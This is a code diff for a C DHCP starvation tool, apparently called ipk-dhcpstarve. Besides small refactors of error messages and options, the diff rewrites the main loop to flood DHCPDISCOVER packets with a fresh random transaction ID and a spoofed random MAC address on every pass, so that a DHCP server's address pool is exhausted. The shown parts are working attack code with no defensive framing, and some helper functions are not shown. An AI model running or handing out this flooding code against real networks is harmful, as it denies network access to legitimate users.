@@ -12,9 +12,9 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <time.h>
-#include <zconf.h>
 #include <arpa/inet.h>
-#include "starve.h"
+#include <getopt.h>
+#include "ipk-dhcpstarve.h"
 
 #define DHCP_SERVER_PORT 67
 #define DHCP_CLIENT_PORT 68
@@ -32,7 +32,7 @@
 #define DHCP_OPTION_MESSAGE_TYPE 53
 #define END_OPTION 255
 
-//#define DEBUG 1
+#define DEBUG 1
 
 #ifdef DEBUG
 #define debug_print(...) \
@@ -54,7 +54,7 @@ int create_dhcp_socket() {
     struct sockaddr_in myname;
     struct ifreq interface;
     int sock;
-    int flag = 1;
+    int reuse_flag = 1;
 
     bzero(&myname, sizeof(myname));
     myname.sin_family = AF_INET;
@@ -63,35 +63,32 @@ int create_dhcp_socket() {
     bzero(&myname.sin_zero, sizeof(myname.sin_zero));
 
     /* create a socket for DHCP communications */
-    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-    if (sock < 0) {
-        printf("Error: Could not create socket!\n");
+    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
+        fprintf(stderr, "Error: Socket not created.\n");
         exit(EXIT_FAILURE);
     }
 
-    /* set the reuse address flag so we don't get errors when restarting */
-    flag = 1;
-    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char *) &flag, sizeof(flag)) < 0) {
-        printf("Error: Could not set reuse address option on DHCP socket!\n");
+    reuse_flag = 1;
+    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char *) &reuse_flag, sizeof(reuse_flag)) < 0) {
+        fprintf(stderr, "Error: Reuse flag not set.\n");
         exit(EXIT_FAILURE);
     }
 
-    /* set the broadcast option - we need this to listen to DHCP broadcast messages */
-    if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, (char *) &flag, sizeof flag) < 0) {
-        printf("Error: Could not set broadcast option on DHCP socket!\n");
+    if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, (char *) &reuse_flag, sizeof reuse_flag) < 0) {
+        fprintf(stderr, "Error: Broadcast not set.\n");
         exit(EXIT_FAILURE);
     }
 
     /* bind socket to interface */
     strncpy(interface.ifr_ifrn.ifrn_name, network_interface_name, IFNAMSIZ);
     if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, (char *) &interface, sizeof(interface)) < 0) {
-        printf("Error: Could not bind socket to interface %s.  Check your privileges...\n", network_interface_name);
+        fprintf(stderr, "Error: You need root privileges to run program.\n");
         exit(EXIT_FAILURE);
     }
 
     /* bind the socket */
     if (bind(sock, (struct sockaddr *) &myname, sizeof(myname)) < 0) {
-        printf("Error: Could not bind to DHCP socket (port %d)!  Check your privileges...\n", DHCP_CLIENT_PORT);
+        fprintf(stderr, "Error: Socket binding.\n");
         exit(EXIT_FAILURE);
     }
 
@@ -143,8 +140,12 @@ void flood_DHCP_discover(int sock) {
 
     /* change xid, MAC addr and send discover */
     while (1) {
-        discover_packet.xid = htonl(random());                  //random transaction number
-        memcpy(discover_packet.chaddr, chaddr, CHADDR_LEN);     //set MAC addr to fake device
+        /* random transaction number */
+        discover_packet.xid = htonl(rand());
+
+        /* generate random MAC addr */
+        generate_chaddr((uint8_t *)&chaddr);
+        memcpy(discover_packet.chaddr, chaddr, CHADDR_LEN);
 
         /* send the DHCPDISCOVER packet out */
         ssize_t bytes_sent = sendto(sock,
@@ -190,6 +191,8 @@ int main(int argc, char **argv) {
     struct in_addr offered_IP;
     struct in_addr server_id;
 
+    printf("Program started.\n");
+
     srand(time(NULL));  //randomize
 
     parse_args(argc, argv);
@@ -197,7 +200,4 @@ int main(int argc, char **argv) {
 
     /* flood DHCP DISCOVER packets*/
     flood_DHCP_discover(dhcp_socket);
-
-//    close(dhcp_socket);
-
 }
